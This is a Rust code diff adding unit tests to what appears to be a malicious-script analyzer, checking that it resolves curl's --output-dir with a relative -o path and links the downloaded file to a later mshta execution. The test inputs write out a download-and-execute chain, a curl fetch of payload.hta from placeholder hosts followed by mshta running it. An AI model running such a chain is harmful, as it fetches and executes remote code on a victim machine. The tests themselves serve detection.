@@ -6107,6 +6107,7 @@ mod powershell_tests {
 
 #[cfg(test)]
 mod curl_tests {
+    use crate::analyze;
     use crate::env::{Config, Environment};
     use crate::interp::interpret_line;
     use crate::traits::Trait;
@@ -6255,6 +6256,62 @@ mod curl_tests {
         assert!(env
             .modified_filesystem
             .contains_key("c:\\temp\\payload.bin"));
+    }
+
+    #[test]
+    fn curl_output_dir_applies_to_relative_output_for_later_execution() {
+        let report = analyze(
+            br#"curl --output-dir C:\Temp -o stage.hta https://curl-output-dir-o.example/payload.hta
+mshta C:\Temp\stage.hta"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://curl-output-dir-o.example/payload.hta"
+                            && dst == r#"C:\Temp\stage.hta"#
+                )
+            }),
+            "curl --output-dir did not join relative -o destination: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r#"mshta C:\Temp\stage.hta"#
+                            && url == "https://curl-output-dir-o.example/payload.hta"
+                )
+            }),
+            "curl --output-dir relative -o destination was not linked on later execution: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn curl_output_dir_relative_output_in_deob_text_uses_joined_destination() {
+        let mut env = Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"curl --output-dir C:\Temp -o stage.hta https://curl-output-dir-o-deob.example/payload.hta"#,
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://curl-output-dir-o-deob.example/payload.hta"
+                            && dst.as_deref() == Some(r#"C:\Temp\stage.hta"#)
+                )
+            }),
+            "curl --output-dir relative -o destination not recovered in deob text: {:?}",
+            env.traits
+        );
     }
 
     #[test]
